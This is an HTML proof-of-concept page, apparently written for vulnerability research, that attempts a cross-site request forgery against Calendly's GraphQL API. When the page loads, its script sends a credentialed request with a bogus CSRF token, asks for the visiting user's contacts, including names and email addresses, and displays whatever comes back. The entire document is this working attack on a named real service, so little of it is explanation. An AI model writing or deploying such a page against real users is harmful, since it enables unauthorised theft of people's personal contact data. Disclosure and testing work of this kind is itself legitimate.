<!DOCTYPE html>
<html>
<head>
  <title>Calendly CSRF PoC</title>
</head>
<body>
  <h2>Calendly CSRF - Contact Data Exfiltration PoC</h2>
  <p>Status: <span id="status">Waiting...</span></p>
  <pre id="output"></pre>

  <script>
    const STATUS = document.getElementById("status");
    const OUTPUT = document.getElementById("output");

    async function attack() {
      STATUS.textContent = "Sending request...";

      try {
        const readRes = await fetch("https://calendly.com/api/oap-api/graphql", {
          method: "POST",
          credentials: "include",
          headers: {
            "Content-Type": "application/json",
            "x-csrf-token": "invalid_token"
          },
          body: JSON.stringify({
            operationName: "GetContacts",
            variables: { input: {} },
            query: `query GetContacts($input: ContactsInput!) {
              contacts(input: $input) {
                edges {
                  node {
                    id
                    fullName
                    email
                  }
                }
              }
            }`
          })
        });

        const data = await readRes.json();
        
        // Dump full raw response so we can see exact structure
        OUTPUT.textContent = JSON.stringify(data, null, 2);

        // Check all possible response paths
        const contacts = 
          data?.data?.contacts?.edges ||
          data?.data?.contacts?.nodes ||
          data?.data?.contacts ||
          data?.errors ||
          null;

        if (!contacts) {
          STATUS.textContent = "Got response - check output for structure";
          return;
        }

        STATUS.textContent = "Success! Records found: " + contacts.length;

      } catch (err) {
        STATUS.textContent = "Error: " + err.message;
        OUTPUT.textContent = err.toString();
      }
    }

    attack();
  </script>
</body>
</html>
